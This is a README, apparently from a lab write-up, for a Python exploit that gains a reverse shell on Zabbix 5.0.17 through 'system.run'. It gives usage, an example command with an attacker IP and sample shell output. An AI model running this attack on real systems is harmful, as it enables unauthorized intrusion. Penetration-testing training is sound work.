markdown
# Zabbix 5.0.17 Remote Code Execution (RCE) Exploit

This repository contains a Python script (`exploit.py`) to exploit a Remote Code Execution (RCE) vulnerability in Zabbix 5.0.17. The script allows you to gain a reverse shell on the target system by exploiting a specific feature within the Zabbix web interface.

## Features
- Automates login to the Zabbix instance.
- Extracts session ID (SID) after successful login.
- Sends a malicious payload to execute a reverse shell on the target.
- Includes a built-in listener for the reverse shell using **pwntools**.

## Requirements
- Python 3.6 or higher.
- **pwntools** library installed. See the installation steps below.

## Installation
Before running the script, ensure you have **pwntools** installed. You can install it using pip:

```bash
pip3 install pwntools
pip3 install requests
```

## Usage
Run the script with the following syntax:

```bash
python3 exploit.py <url> <user> <password> <lhost> <lport>
```

### Parameters
- `<url>`: URL of the Zabbix instance (e.g., `http://zabbix.example.com`).
- `<user>`: Username of a valid Zabbix account (e.g., `Administrator`).
- `<password>`: Password for the account.
- `<lhost>`: Your local host IP to receive the reverse shell.
- `<lport>`: Your local port to receive the reverse shell.

### Example
```bash
python3 exploit.py http://zabbix.shibboleth.htb Administrator yourpassword 10.10.14.16 443
```

## How It Works
1. **Login**: The script logs into the Zabbix instance using the provided credentials.
2. **SID Extraction**: It extracts the session ID (SID) from the response after login.
3. **Payload Delivery**: Sends a `system.run` payload with a reverse shell command to the server.
4. **Reverse Shell**: The target system connects back to the attacker's listener.

## Listener
The script includes a reverse shell listener powered by **pwntools**. The listener waits for incoming connections on the specified `lhost` and `lport`.

## Output
- Upon successful exploitation, you will gain an interactive shell on the target system.
- Example output:
  ```
  Listener started on 10.10.14.16:443, waiting for a connection...
  Connection received!
  Shell> whoami
  zabbix
  ```

## Notes
- Ensure that the Zabbix instance is vulnerable before running this exploit.
- Use this script only for educational purposes and authorized penetration testing.

## Disclaimer
This tool is intended for educational and authorized penetration testing purposes only. The author does not take responsibility for any misuse of this script.


